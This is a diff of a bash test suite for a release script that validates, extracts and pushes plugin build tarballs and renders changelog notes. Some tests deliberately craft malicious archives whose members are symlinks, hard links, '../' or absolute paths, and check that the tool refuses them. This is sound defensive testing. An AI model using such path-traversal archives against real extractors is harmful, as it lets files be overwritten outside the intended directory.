-check "$what: the notice names both commits and the run" \
-  "$(contains "$out" "^::notice title=Nothing pushed; a fresh run started::main's tip $sibling does not descend from $base, the commit the build was made from, so main was rewritten; nothing was pushed, and a fresh run of claude-envoy-rebuild\.yaml on main, $fresh_url, builds main's tip$")"
-push_built "$pb/rewritten/a" "$base" "$pb/trees/rewritten.tar" GH_TEST_FAIL=run
-check "$what, gh workflow run fails: exits 1, naming the command a person runs, origin as it was" \
-  "$(is "$rc|$(contains "$out" "^::error::release-push\.sh push-built: main's tip $sibling does not descend from $base, .*, and starting a fresh run of claude-envoy-rebuild\.yaml on main failed; start one by hand: gh workflow run claude-envoy-rebuild\.yaml --repo example/repo --ref main$")|$(git -C "$pb/rewritten/origin.git" rev-parse main)" "1|true|$sibling")"
-
-# Main moves again between push-built's fetch and its push: the `git` wrapper runs the real git,
-# and after the first fetch alone it lands one more merge on origin's main from the seed.
-mkdir -p "$pb/race-bin"
-cat > "$pb/race-bin/git" <<'GIT'
-#!/usr/bin/env bash
-status=0
-"$REAL_GIT" "$@" || status=$?
-if [ "$1" = fetch ] && [ ! -e "$RACE_DIR/raced" ]; then
-  : > "$RACE_DIR/raced"
-  "$REAL_GIT" -C "$RACE_DIR/seed" commit -q --allow-empty -m "fix: a merge landing during the push"
-  "$REAL_GIT" -C "$RACE_DIR/seed" push -q "$RACE_DIR/origin.git" main
-fi
-exit "$status"
-GIT
-chmod +x "$pb/race-bin/git"
-real_git=$(command -v git)
-# race_run <name> [VAR=value...]: a case under $pb/<name> whose main moved by a build input, then
-# push_built through the wrapper; leaves main's new tip, the wrapper's merge, in raced.
-race_run() {
-  local dir="$pb/$1"
-  shift
-  built_setup "$dir"
-  printf 'export const reconnect = true;\n' >> "$dir/seed/packages/claude-envoy/src/channel.ts"
-  move_main "$dir" "fix(claude-envoy): reconnect"
-  built_tar "${dir##*/}" rebuilt
-  push_built "$dir/a" "$base" "$pb/trees/${dir##*/}.tar" PATH="$pb/race-bin:$work/restart-bin:$PATH" \
-    REAL_GIT="$real_git" RACE_DIR="$dir" "$@"
-  raced=$(git -C "$dir/origin.git" rev-parse main)
-  check "$what: the wrapper landed one merge on the moved tip, and nothing else landed" \
-    "$(is "$(git -C "$dir/origin.git" rev-list --parents -n 1 main)|$(git -C "$dir/origin.git" log -1 --format=%s main)" "$raced $moved|fix: a merge landing during the push")"
-}
-what="main moves again after push-built's fetch, with a changed input"
-race_run race
-check "$what: exits 0, starting exactly one fresh run (land_on_main's, no second one)" \
-  "$(is "$rc|$calls|$left" "0|$rebuild_run|0")"
-check "$what: land_on_main's notice names the tip push-built built on and main's new tip" \
-  "$(contains "$out" "^::notice title=Nothing pushed; a fresh run started::main moved from $moved, the commit [0-9a-f]* was made on, to $raced, so [0-9a-f]* was not pushed; a fresh run of claude-envoy-rebuild\.yaml on main, $fresh_url, builds main's tip$")"
-check "$what: no notice of push-built's own fresh run" "$(is "$(contains "$out" 'A fresh run started')" false)"
-what="main moves again after push-built's fetch, gh workflow run fails"
-race_run race-gh GH_TEST_FAIL=run
-check "$what: exits 1, after one attempt to start a run, leaving nothing in TMPDIR" \
-  "$(is "$rc|$calls|$left" "1|$rebuild_run|0")"
-check "$what: the error names both commits and the command a person runs" \
-  "$(contains "$out" "^::error::release-push\.sh push-built: main moved from $moved, the commit [0-9a-f]* was made on, to $raced, and starting a fresh run of claude-envoy-rebuild\.yaml on main failed; start one by hand: gh workflow run claude-envoy-rebuild\.yaml --repo example/repo --ref main$")"
-
-built_setup "$pb/rejected"
-printf '#!/bin/sh\necho "rejected by test hook" >&2\nexit 1\n' > "$pb/rejected/origin.git/hooks/pre-receive"
-chmod +x "$pb/rejected/origin.git/hooks/pre-receive"
-built_tar rejected rebuilt
-push_built "$pb/rejected/a" "$base" "$pb/trees/rejected.tar"
-check "a push rejected while main's tip is still the base: exits 1, calling no gh" "$(is "$rc|$calls" "1|")"
-check "a push rejected while main's tip is still the base: says so" \
-  "$(contains "$out" "^::error::release-push\.sh push-built: the push of [0-9a-f]* to main was rejected while main's tip is still $base, the commit [0-9a-f]* was made on, so no newer commit beat it; the push itself failed$")"
-check "a push rejected while main's tip is still the base: origin is untouched" \
-  "$(is "$(git -C "$pb/rejected/origin.git" rev-parse main)|$left" "$base|0")"
-
-built_setup "$pb/nokey"
-record_hook "$pb/nokey/origin.git"
-built_tar nokey rebuilt
-: > "$pb/nokey/seen"
-push_built "$pb/nokey/a" "$base" "$pb/trees/nokey.tar" DEPLOY_KEY= PUSH_SEEN="$pb/nokey/seen"
-check "no DEPLOY_KEY: exits 1, with an ::error:: naming the command and the variable" \
-  "$(is "$rc|$(contains "$out" '^::error::release-push\.sh push-built: DEPLOY_KEY')" '1|true')"
-check "no DEPLOY_KEY: nothing was pushed, origin is untouched, gh never called, nothing made in TMPDIR" \
-  "$(is "$(<"$pb/nokey/seen")|$(git -C "$pb/nokey/origin.git" rev-parse main)|$calls|$left" "|$base||0")"
-
-# A doctored tar is refused before any fetch, however main moved: exit 1, origin as it was, no gh
-# call, nothing in TMPDIR.
-built_tar symlink-moved rebuilt 'ln -s envoy-channel.js dist/link.js'
-for how in docs input; do
-  dir="$pb/doctored-$how"
-  built_setup "$dir"
-  if [ "$how" = docs ]; then
-    printf 'notes\n' > "$dir/seed/notes.md"
-    what="a symlink member, main moved by a docs-only commit"
-  else
-    printf 'export const reconnect = true;\n' >> "$dir/seed/packages/claude-envoy/src/channel.ts"
-    what="a symlink member, main moved by a build input"
-  fi
-  move_main "$dir" "fix: a merge landing after the build started"
-  push_built "$dir/a" "$base" "$pb/trees/symlink-moved.tar"
-  check "$what: exits 1, naming the member" \
-    "$(is "$rc|$(contains "$out" "^::error::release-push\.sh push-built: member dist/link\.js of .*symlink-moved\.tar is a symlink")" "1|true")"
-  check "$what: origin as it was, no gh call, nothing in TMPDIR" \
-    "$(is "$(git -C "$dir/origin.git" rev-parse main)|$calls|$left" "$moved||0")"
-done
-
-# The refusals share one origin and clone, since each must leave both as they were.
-built_setup "$pb/r"
-rbase=$base rfirst=$first
-# built_refused <description> <regex>: exit 1, an ::error:: matching <regex>, origin's main, the
-# clone's HEAD and its work tree (`git status --porcelain`, against $rstatus) as they were, and no
-# gh call.
-rstatus=''
-built_refused() {
-  check "$1: exits 1" "$(is "$rc" 1)"
-  check "$1: the error names it" "$(contains "$out" "^::error::release-push\.sh push-built: $2")"
-  check "$1: origin, the clone and its work tree as they were; no gh call" \
-    "$(is "$(git -C "$pb/r/origin.git" rev-parse main)|$(git -C "$pb/r/a" rev-parse HEAD)|$(git -C "$pb/r/a" status --porcelain)|$calls" "$rbase|$rbase|$rstatus|")"
-}
-tars="$pb/trees"
-built_tar symlink rebuilt 'ln -s envoy-channel.js dist/link.js'
-push_built "$pb/r/a" "$rbase" "$tars/symlink.tar"
-built_refused "a symlink member" "member dist/link\.js of .*symlink\.tar is a symlink"
-built_tar hardlink rebuilt 'ln dist/dispatch.js dist/dispatch-copy.js'
-push_built "$pb/r/a" "$rbase" "$tars/hardlink.tar"
-built_refused "a hard link member" "member dist/dispatch[-a-z]*\.js of .*hardlink\.tar is a hard link"
-built_tar dotdot rebuilt '' --transform 's,^dist/dispatch\.js$,../dispatch.js,' dist legion
-check "the ../ tar holds ../dispatch.js" "$(contains "$(tar -tf "$tars/dotdot.tar" 2>/dev/null)" '^\.\./dispatch\.js$')"
-push_built "$pb/r/a" "$rbase" "$tars/dotdot.tar"
-built_refused "a ../ member" "member \.\./dispatch\.js of .* has a '\.\.' component"
-built_tar dotdot-inner rebuilt '' --transform 's,^dist/dispatch\.js$,dist/../../dispatch.js,' dist legion
-push_built "$pb/r/a" "$rbase" "$tars/dotdot-inner.tar"
-built_refused "a member climbing out through dist/../.." "member dist/\.\./\.\./dispatch\.js of .* has a '\.\.' component"
-built_tar absolute rebuilt '' --transform 's,^dist/dispatch\.js$,/dispatch.js,' -P dist legion
-check "the absolute tar holds /dispatch.js" "$(contains "$(tar -tf "$tars/absolute.tar" 2>/dev/null)" '^/dispatch\.js$')"
-push_built "$pb/r/a" "$rbase" "$tars/absolute.tar"
-built_refused "an absolute member" "member /dispatch\.js of .* is an absolute path"
-built_tar readme rebuilt 'printf "x\n" > README.md' dist legion README.md
-push_built "$pb/r/a" "$rbase" "$tars/readme.tar"
-built_refused "a member outside the two directories, README.md" "member README\.md of .* is not dist, legion or a path under them"
-built_tar src rebuilt 'mkdir src && printf "x\n" > src/x' dist legion src
-push_built "$pb/r/a" "$rbase" "$tars/src.tar"
-built_refused "a member outside the two directories, src/x" "member src/ of .* is not dist, legion or a path under them"
-built_tar space rebuilt 'printf "x\n" > "dist/a b.js"'
-push_built "$pb/r/a" "$rbase" "$tars/space.tar"
-# %q quotes the space as 'dist/a b.js' or dist/a\ b.js, by bash version.
-built_refused "a member whose name holds another character, a space" 'member .\{0,1\}dist/a\\\{0,1\} b\.js.\{0,1\} of .* is not dist, legion or a path under them'
-built_tar executable rebuilt 'chmod +x dist/envoy-channel.js'
-push_built "$pb/r/a" "$rbase" "$tars/executable.tar"
-built_refused "an executable member" "member dist/envoy-channel\.js of .* has the mode -rwx[-rwx]*, with an execute"
-built_tar no-channel rebuilt 'rm dist/envoy-channel.js'
-push_built "$pb/r/a" "$rbase" "$tars/no-channel.tar"
-built_refused "a tar missing dist/envoy-channel.js" ".*no-channel\.tar lacks dist/envoy-channel\.js, a file every build of the plugin holds"
-built_tar no-manifest rebuilt 'rm legion/.claude-plugin/plugin.json'
-push_built "$pb/r/a" "$rbase" "$tars/no-manifest.tar"
-built_refused "a tar missing legion/.claude-plugin/plugin.json" ".*no-manifest\.tar lacks legion/\.claude-plugin/plugin\.json"
-built_tar no-agents rebuilt 'rm -r legion/agents'
-push_built "$pb/r/a" "$rbase" "$tars/no-agents.tar"
-built_refused "a tar with no file under legion/agents/" ".*no-agents\.tar holds no file under legion/agents/"
-built_tar good rebuilt
-for forged in HEAD "${rbase:0:12}" "${rbase^^}" "$rbase "; do
-  push_built "$pb/r/a" "$forged" "$tars/good.tar"
-  printf -v shown '%q' "$forged"
-  built_refused "a base that is not 40 lower-case hex, $shown" "the base commit .* is not 40 lower-case hex"
-done
-push_built "$pb/r/a" "$rfirst" "$tars/good.tar"
-built_refused "HEAD not at the base" "HEAD is $rbase, not $rfirst, the commit the build was made from"
-printf 'edited\n' >> "$pb/r/a/README.md"
-rstatus=' M README.md'
-push_built "$pb/r/a" "$rbase" "$tars/good.tar"
-built_refused "a dirty work tree" "the work tree is not clean ( M README\.md)"
-git -C "$pb/r/a" checkout -q -- README.md
-rstatus=''
-push_built "$pb/r/a" "$rbase" "$pb/trees/no-such.tar"
-built_refused "a tar that does not exist" "listing .*no-such\.tar failed"
-
-echo
-echo "Case: check-built accepts what push-built accepts and refuses what it refuses, writing nothing"
-# The tars above, plus a skill script made executable (as `cp -R` stages a skill's mode into
-# legion/) and a build lacking the dispatch bundle (a renamed entry in BUNDLE_ENTRYPOINTS). Each
-# run is from an empty directory outside any repository, with an empty TMPDIR, and the tar's
-# directory is compared before and after: check-built needs no checkout and writes nothing.
 cb="$pb/cb"
 # check_built <tar> [<arg>...]: runs `release-push.sh check-built <tar> [<arg>...]` from the empty
 # directory $cb/run with TMPDIR=$cb/tmp; leaves its exit code in rc, its combined output in out,
@@ -2116,20 +1283,52 @@ check_refused() {
   check "check-built, $1: exits 1, writing nothing" "$(is "$rc|$written" "1|0|true")"
   check "check-built, $1: the error names it" "$(contains "$out" "^::error::release-push\.sh check-built: $2")"
 }
+built_tar good rebuilt
 check_built "$tars/good.tar"
 check "check-built, a good build: exits 0, printing nothing and writing nothing" "$(is "$rc|$out|$written" "0||0|true")"
+built_tar symlink rebuilt 'ln -s envoy-channel.js dist/link.js'
+check_built "$tars/symlink.tar"
+check_refused "a symlink member" "member dist/link\.js of .*symlink\.tar is a symlink"
+built_tar hardlink rebuilt 'ln dist/dispatch.js dist/dispatch-copy.js'
+check_built "$tars/hardlink.tar"
+check_refused "a hard link member" "member dist/dispatch[-a-z]*\.js of .*hardlink\.tar is a hard link"
+built_tar dotdot rebuilt '' --transform 's,^dist/dispatch\.js$,../dispatch.js,' dist legion
+check "the ../ tar holds ../dispatch.js" "$(contains "$(tar -tf "$tars/dotdot.tar" 2>/dev/null)" '^\.\./dispatch\.js$')"
+check_built "$tars/dotdot.tar"
+check_refused "a ../ member" "member \.\./dispatch\.js of .* has a '\.\.' component"
+built_tar dotdot-inner rebuilt '' --transform 's,^dist/dispatch\.js$,dist/../../dispatch.js,' dist legion
+check_built "$tars/dotdot-inner.tar"
+check_refused "a member climbing out through dist/../.." "member dist/\.\./\.\./dispatch\.js of .* has a '\.\.' component"
+built_tar absolute rebuilt '' --transform 's,^dist/dispatch\.js$,/dispatch.js,' -P dist legion
+check "the absolute tar holds /dispatch.js" "$(contains "$(tar -tf "$tars/absolute.tar" 2>/dev/null)" '^/dispatch\.js$')"
+check_built "$tars/absolute.tar"
+check_refused "an absolute member" "member /dispatch\.js of .* is an absolute path"
+built_tar readme rebuilt 'printf "x\n" > README.md' dist legion README.md
+check_built "$tars/readme.tar"
+check_refused "a member outside the two directories, README.md" "member README\.md of .* is not dist, legion or a path under them"
+built_tar src rebuilt 'mkdir src && printf "x\n" > src/x' dist legion src
+check_built "$tars/src.tar"
+check_refused "a member outside the two directories, src/x" "member src/ of .* is not dist, legion or a path under them"
+built_tar space rebuilt 'printf "x\n" > "dist/a b.js"'
+check_built "$tars/space.tar"
+# %q quotes the space as 'dist/a b.js' or dist/a\ b.js, by bash version.
+check_refused "a member whose name holds another character, a space" 'member .\{0,1\}dist/a\\\{0,1\} b\.js.\{0,1\} of .* is not dist, legion or a path under them'
+built_tar executable rebuilt 'chmod +x dist/envoy-channel.js'
 check_built "$tars/executable.tar"
 check_refused "an executable member" "member dist/envoy-channel\.js of .*executable\.tar has the mode -rwx[-rwx]*, with an execute"
 built_tar skill-script rebuilt 'mkdir legion/skills/legion-worker/scripts && printf "x\n" > legion/skills/legion-worker/scripts/x.sh && chmod 755 legion/skills/legion-worker/scripts/x.sh'
 check_built "$tars/skill-script.tar"
 check_refused "an executable skill script" "member legion/skills/legion-worker/scripts/x\.sh of .* has the mode -rwxr-xr-x, with an execute"
-check_built "$tars/symlink.tar"
-check_refused "a symlink member" "member dist/link\.js of .*symlink\.tar is a symlink"
-check_built "$tars/space.tar"
-check_refused "a member whose name holds a space" 'member .\{0,1\}dist/a\\\{0,1\} b\.js.\{0,1\} of .* is not dist, legion or a path under them'
+built_tar no-channel rebuilt 'rm dist/envoy-channel.js'
+check_built "$tars/no-channel.tar"
+check_refused "a tar missing dist/envoy-channel.js" ".*no-channel\.tar lacks dist/envoy-channel\.js, a file every build of the plugin holds"
 built_tar no-dispatch rebuilt 'rm dist/dispatch.js'
 check_built "$tars/no-dispatch.tar"
 check_refused "a tar missing dist/dispatch.js" ".*no-dispatch\.tar lacks dist/dispatch\.js, a file every build of the plugin holds"
+built_tar no-manifest rebuilt 'rm legion/.claude-plugin/plugin.json'
+check_built "$tars/no-manifest.tar"
+check_refused "a tar missing legion/.claude-plugin/plugin.json" ".*no-manifest\.tar lacks legion/\.claude-plugin/plugin\.json"
+built_tar no-agents rebuilt 'rm -r legion/agents'
 check_built "$tars/no-agents.tar"
 check_refused "a tar with no file under legion/agents/" ".*no-agents\.tar holds no file under legion/agents/"
 check_built "$tars/no-such.tar"
@@ -2139,14 +1338,22 @@ check_refused "a second argument" "usage: release-push\.sh check-built <tar>$"
 
 echo
 echo "Case: extract-built replaces the two directories with exactly a checked build, and leaves them untouched when it refuses one"
-# A clone of a push-built origin, whose two directories hold the seed build and an untracked file
-# of their own. extract-built runs from a subdirectory of the clone with the tar's path relative to
-# it, with no credential in its environment, as the rebuild's build job and the claude-envoy job
-# run it.
-built_setup "$pb/x"
-xa="$pb/x/a"
-xbase=$base
+# A checkout whose two directories hold the seed build and an untracked file of their own, as a
+# job's checkout holds them once verify-build.sh has run. Neither directory is tracked: nothing
+# commits them. extract-built runs from a subdirectory of the checkout with the tar's path
+# relative to it, with no credential in its environment, as release.yaml's claude_envoy_build and
+# ci.yaml's claude-envoy job run it.
+xa="$pb/x"
+mkdir -p "$xa/packages/claude-envoy"
+git init -q -b main "$xa"
+identity "$xa"
+printf 'seed line\n' > "$xa/README.md"
+git -C "$xa" add -A
+git -C "$xa" commit -q -m "seed"
+xbase=$(git -C "$xa" rev-parse HEAD)
+plugin_tree "$xa/packages/claude-envoy" seed
 printf 'stale\n' > "$xa/packages/claude-envoy/dist/stale.js"
+built_tar land rebuilt 'rm legion/agents/deep-worker.md && mkdir legion/skills/new-skill && printf "new\n" > legion/skills/new-skill/SKILL.md'
 # extract_built <tar> [<arg>...]: runs `release-push.sh extract-built <tar> [<arg>...]` from
 # $xa/packages; leaves its exit code in rc and its combined output in out.
 extract_built() {
@@ -2155,21 +1362,21 @@ extract_built() {
   rc=$?
   set -e
 }
-# x_tree: every entry under the clone's two directories, with its type and mode, then every
+# x_tree: every entry under the checkout's two directories, with its type and mode, then every
 # file's checksum.
 x_tree() {
   (cd "$xa/packages/claude-envoy" && find dist legion -printf '%y %m %p\n' | LC_ALL=C sort &&
     find dist legion -type f -exec sha256sum {} + | LC_ALL=C sort)
 }
 x_before=$(x_tree)
-extract_built ../../../trees/executable.tar
+extract_built ../../trees/executable.tar
 check "extract-built, an executable member: exits 1, naming it" \
   "$(is "$rc|$(contains "$out" "^::error::release-push\.sh extract-built: member dist/envoy-channel\.js of .*executable\.tar has the mode -rwx[-rwx]*, with an execute")" "1|true")"
 check "extract-built, an executable member: the two directories are untouched" "$(is "$(x_tree)" "$x_before")"
-extract_built ../../../trees/land.tar extra
+extract_built ../../trees/land.tar extra
 check "extract-built, a second argument: exits 1 with its usage, the directories untouched" \
   "$(is "$rc|$(contains "$out" '^::error::release-push\.sh extract-built: usage: release-push\.sh extract-built <tar>$')|$(is "$(x_tree)" "$x_before")" "1|true|true")"
-extract_built ../../../trees/land.tar
+extract_built ../../trees/land.tar
 check "extract-built, a good build: exits 0, printing nothing" "$(is "$rc|$out" "0|")"
 check "extract-built, a good build: the two directories hold exactly the tar's files, the stale file and the one the build dropped deleted" \
   "$(is "$(cd "$xa/packages/claude-envoy" && find dist legion -type f | LC_ALL=C sort)" "$(cd "$tars/land" && find dist legion -type f | LC_ALL=C sort)")"
@@ -2429,12 +1636,13 @@ check "an unreadable git configuration: exits 1, naming git config's exit code" 
   "$(is "$rc|$(contains "$out" '^::error::git config --get-regexp exited 128, so the git configuration could not be read$')" '1|true')"
 
 echo
-echo "Case: fold-plan labels each fragment with the release that first shipped it, and push-fold lands the fold"
-# The template: clone a, detached at the base (the fold's checkout), and a bare origin whose main
-# is the base. packages/rel is released under rel-v; packages/side and packages/plain have no
-# release of their own; packages/empty has no fragment; packages/nolog has no CHANGELOG.md and no
-# fragment either, since fold-plan warns on stderr about a fragment of a package no spec names and
-# this case's first check expects an empty stderr.
+echo "Case: fold-notes refuses a version, a package, a prefix or an entry no release can render"
+# The template: clone a, whose main holds packages/rel, released under rel-v, with fragments
+# added before, between and after release tags of both shapes; packages/empty, which has a
+# changie configuration and no fragment; and packages/nolog, which has a fragment and no
+# configuration. The rendering cases below check it out at each release's own commit, detached,
+# as that release's build job has it.
+u=.changes/unreleased
 ft="$work/fold-template"
 mkdir -p "$ft/a"
 git init -q -b main "$ft/a"
@@ -2451,121 +1659,116 @@ fragment() {
   mkdir -p "$ft/a/packages/$1/.changes/unreleased"
   printf 'kind: %s\nbody: %s\n' "$3" "$4" > "$ft/a/packages/$1/.changes/unreleased/$2.yaml"
 }
-mkdir -p "$ft/a/packages/rel" "$ft/a/packages/side" "$ft/a/packages/plain" "$ft/a/packages/empty" "$ft/a/packages/nolog"
-rel_log='# Changelog
-
-## [2.0.0] - 2026-01-01
-
-### Added
-
-- a release on top
-
-## [Unreleased]
-
-### Added
-
-- an old unreleased entry
-
-## [1.5.0]
-
-### Fixed
-
-- an old fix'
-side_log='# Changelog
-
-## [Unreleased]
-
-- an old side entry'
-plain_log='# Changelog
-
-No release yet.'
-printf '%s\n' "$rel_log" > "$ft/a/packages/rel/CHANGELOG.md"
-printf '%s\n' "$side_log" > "$ft/a/packages/side/CHANGELOG.md"
-printf '%s\n' "$plain_log" > "$ft/a/packages/plain/CHANGELOG.md"
-printf '# Changelog\n' > "$ft/a/packages/empty/CHANGELOG.md"
+# changie_config <package dir>: this file's own minimal changie configuration, which renders a
+# fragment of a kind and a body and nothing else. The shipped configuration gets a case of its
+# own below.
+changie_config() {
+  cat > "$1/.changie.yaml" <<'CHANGIE'
+changesDir: .changes
+unreleasedDir: unreleased
+changelogPath: CHANGELOG.md
+versionExt: md
+versionFormat: ''
+kindFormat: '### {{.Kind}}'
+changeFormat: '- {{.Body}}'
+newlines:
+  beforeKind: 1
+  afterKind: 1
+kinds:
+  - label: Added
+  - label: Changed
+  - label: Fixed
+CHANGIE
+}
+mkdir -p "$ft/a/packages/rel" "$ft/a/packages/empty" "$ft/a/packages/nolog"
 printf '{"name": "rel", "version": "1.5.0"}\n' > "$ft/a/packages/rel/package.json"
-printf 'no changelog\n' > "$ft/a/packages/nolog/README.md"
+printf 'no changie configuration\n' > "$ft/a/packages/nolog/README.md"
+changie_config "$ft/a/packages/rel"
+changie_config "$ft/a/packages/empty"
 commit_at 2026-02-01T12:00:00+00:00 "chore: seed"
 fragment rel INFRA-1-first Added "the first entry"
 fragment rel INFRA-1-another Added "another entry"
-fragment side INFRA-1-side Changed "a side entry"
 commit_at 2026-02-10T12:00:00+00:00 "feat: first"
-# The bump-shaped release tag: on a child of the built commit that main never holds, committed
-# at 23:30 on March 1 in UTC-5, which is March 2 in UTC.
+c1=$(git -C "$ft/a" rev-parse HEAD)
+# The bump-shaped release tag: on a child of the built commit that main never holds, which
+# contains every commit up to the one the release built.
 git -C "$ft/a" checkout -q --detach
 printf '{"name": "rel", "version": "1.9.0"}\n' > "$ft/a/packages/rel/package.json"
 commit_at 2026-03-01T23:30:00-05:00 "chore: release rel v1.9.0 [skip ci]"
 git -C "$ft/a" tag rel-v1.9.0
 git -C "$ft/a" checkout -q main
 fragment rel INFRA-2-second Fixed "the second entry"
-# The listener-shaped tag, on the built commit itself, at 01:00 on March 5 in UTC+9.
+# The listener-shaped tag, on the built commit itself.
 commit_at 2026-03-05T01:00:00+09:00 "feat: second"
+c2=$(git -C "$ft/a" rev-parse HEAD)
 git -C "$ft/a" tag rel-v1.10.0
-fragment rel INFRA-3-third Added "in no release yet"
-fragment side INFRA-3-side Fixed "another side entry"
-fragment plain INFRA-3-plain Added "a plain entry"
+fragment rel INFRA-3-third Added "the third entry"
+fragment nolog INFRA-3-nolog Added "an entry of a package with no configuration"
 commit_at 2026-04-10T22:15:00-07:00 "feat: third"
+c3=$(git -C "$ft/a" rev-parse HEAD)
+# A name under the prefix that is no release: it bounds no group and is rendered nowhere.
 git -C "$ft/a" tag rel-v1.11.0-rc.1
-base=$(git -C "$ft/a" rev-parse HEAD)
-c2=$(git -C "$ft/a" rev-parse HEAD~1)
-main_label="main@${base:0:12}"
-git clone -q --bare "$ft/a" "$ft/origin.git"
-git -C "$ft/a" checkout -q --detach
-# Only in the working tree, never committed: not a fragment of HEAD.
-printf 'kind: Added\nbody: untracked\n' > "$ft/a/packages/rel/.changes/unreleased/INFRA-9-untracked.yaml"
 
-# fold_plan_run <spec>...: runs fold-plan in the template's clone; leaves rc, out (stdout) and
-# err (stderr).
-fold_plan_run() {
+# notes_run <commit> <version> <package-dir> <tag-prefix>: checks the template's clone out at
+# <commit>, detached, and runs fold-notes there into one notes file; leaves rc, out (stdout, the
+# `notes=` line), err, wrote (whether the file is there) and notes (its content, empty when none
+# was written).
+notes_file="$work/fold-notes.md"
+notes_run() {
+  rm -f "$notes_file"
+  git -C "$ft/a" checkout -q --detach "$1"
   set +e
-  out=$(cd "$ft/a" && "$release_push" fold-plan "$@" 2>"$work/fold-plan.err")
+  out=$(cd "$ft/a" && "$release_push" fold-notes "$2" "$notes_file" "$3" "$4" 2>"$work/fold-notes.err")
   rc=$?
   set -e
-  err=$(<"$work/fold-plan.err")
+  err=$(<"$work/fold-notes.err")
+  notes='' wrote=false
+  [ ! -f "$notes_file" ] || { notes=$(<"$notes_file"); wrote=true; }
 }
-u=.changes/unreleased
-rel_plan="packages/rel	1.9.0	2026-03-02	packages/rel/$u/INFRA-1-another.yaml
-packages/rel	1.9.0	2026-03-02	packages/rel/$u/INFRA-1-first.yaml
-packages/rel	1.10.0	2026-03-04	packages/rel/$u/INFRA-2-second.yaml"
-side_plan="packages/side	$main_label	2026-04-11	packages/side/$u/INFRA-1-side.yaml
-packages/side	$main_label	2026-04-11	packages/side/$u/INFRA-3-side.yaml"
-plain_plan="packages/plain	$main_label	2026-04-11	packages/plain/$u/INFRA-3-plain.yaml"
-# Every package of the template that holds a fragment, since fold-plan warns on stderr about a
-# fragment of a package no spec names.
-full_plan="$rel_plan"$'\n'"$side_plan"$'\n'"$plain_plan"
-fold_plan_run packages/rel=rel-v packages/side packages/plain
-check "fold-plan: exits 0, saying nothing on stderr" "$(is "$rc|$err" "0|")"
-check "fold-plan: a fragment under two tags gets the lower version, one under the listener-shaped tag its version, one in no release none, in version order, dated in UTC" \
-  "$(is "$out" "$full_plan")"
-fold_plan_run packages/plain packages/side packages/rel=rel-v
-check "fold-plan: the packages come in the specs' order" \
-  "$(is "$out" "$plain_plan"$'\n'"$side_plan"$'\n'"$rel_plan")"
-fold_plan_run packages/rel=rel-v packages/side packages/plain packages/empty
-check "fold-plan: a package without fragments plans nothing" "$(is "$rc|$out" "0|$full_plan")"
-fold_plan_run
-check "fold-plan: no spec is refused" "$(is "$rc|$(contains "$err" '^::error::release-push.sh fold-plan: no package spec')" "1|true")"
-for spec in packages/rel= ../rel 'packages/rel=rel v' /packages/rel; do
-  fold_plan_run "$spec"
-  printf -v shown '%q' "$spec"
-  check "fold-plan: the spec $shown is refused" \
-    "$(is "$rc|$out|$(contains "$err" '^::error::release-push.sh fold-plan: package spec .* is not <package-dir>\[=<tag-prefix>\]')" "1||true")"
+notes_run "$c3" 1.9 packages/rel rel-v
+check "fold-notes: a version that is not X.Y.Z is refused, writing nothing" \
+  "$(is "$rc|$wrote|$(contains "$err" '^::error::release-push\.sh fold-notes: the release version 1\.9 is not X\.Y\.Z')" "1|false|true")"
+for dir in ../rel /packages/rel 'packages/rel=rel-v'; do
+  notes_run "$c3" 1.11.0 "$dir" rel-v
+  printf -v shown '%q' "$dir"
+  check "fold-notes: the package directory $shown is refused" \
+    "$(is "$rc|$wrote|$(contains "$err" '^::error::release-push\.sh fold-notes: package directory .* is not a relative path')" "1|false|true")"
 done
-fold_plan_run packages/side other/side
-check "fold-plan: two specs of one basename are refused" "$(is "$rc|$(contains "$err" 'two package specs name a directory side')" "1|true")"
-fold_plan_run packages/rel=rel-v packages/nolog
-check "fold-plan: a package without CHANGELOG.md is refused, printing no plan" \
-  "$(is "$rc|$out|$(contains "$err" '^::error::release-push.sh fold-plan: packages/nolog holds no CHANGELOG.md at HEAD')" "1||true")"
+for prefix in '' 'rel v' rel/v; do
+  notes_run "$c3" 1.11.0 packages/rel "$prefix"
+  printf -v shown '%q' "$prefix"
+  check "fold-notes: the tag prefix $shown is refused: a release line is what bounds a release" \
+    "$(is "$rc|$wrote|$(contains "$err" '^::error::release-push\.sh fold-notes: tag prefix .* holds more than letters, digits')" "1|false|true")"
+done
+# usage_run <arg>...: runs fold-notes with those arguments in the template's clone, as it stands;
+# leaves rc and out (combined).
+usage_run() {
+  set +e
+  out=$(cd "$ft/a" && "$release_push" fold-notes "$@" 2>&1)
+  rc=$?
+  set -e
+}
+usage='usage: release-push\.sh fold-notes <version> <notes-file> <package-dir> <tag-prefix>'
+usage_run 1.11.0 "$notes_file" packages/rel
+check "fold-notes: no tag prefix at all is refused, naming the usage" \
+  "$(is "$rc|$(contains "$out" "^::error::release-push\.sh fold-notes: $usage\$")" "1|true")"
+usage_run 1.11.0 "$notes_file" packages/rel rel-v packages/empty
+check "fold-notes: a second package is refused: one release of one package goes into one file" \
+  "$(is "$rc|$(contains "$out" "^::error::release-push\.sh fold-notes: $usage\$")" "1|true")"
+notes_run "$c3" 1.11.0 packages/nolog rel-v
+check "fold-notes: a package whose entries are in the release but holds no .changie.yaml is refused" \
+  "$(is "$rc|$wrote|$(contains "$err" '^::error::release-push\.sh fold-notes: packages/nolog holds no \.changie\.yaml at HEAD to render its fragments with$')" "1|false|true")"
 
 # Anything directly in an unreleased directory but a regular file whose name ends in .yaml is
-# refused, by name, with no plan printed: the fold would never fold it. Each package of this
-# repository holds one fragment and one such entry: a subdirectory, a .yml file, a README.md and
-# a symlink.
+# refused, by name, with nothing rendered: no release would ever render it. Each package of this
+# repository holds one fragment and one such entry — a subdirectory, a .yml file, a README.md, a
+# symlink — and packages/two holds two of them. fold-check refuses them the same way, from the
+# same listing, and neither command reaches changie to do it.
 rt="$work/fold-refuse"
 git init -q -b main "$rt"
 identity "$rt"
-for package in sub yml readme link; do
+for package in sub yml readme link two; do
   mkdir -p "$rt/packages/$package/$u"
-  printf '# Changelog\n' > "$rt/packages/$package/CHANGELOG.md"
   printf 'kind: Added\nbody: fine\n' > "$rt/packages/$package/$u/INFRA-1-fine.yaml"
 done
 mkdir -p "$rt/packages/sub/$u/sjawhar"
@@ -2573,63 +1776,265 @@ printf 'kind: Added\nbody: nested\n' > "$rt/packages/sub/$u/sjawhar/fix-thing.ya
 printf 'kind: Added\nbody: yml\n' > "$rt/packages/yml/$u/INFRA-1-a.yml"
 printf 'not a fragment\n' > "$rt/packages/readme/$u/README.md"
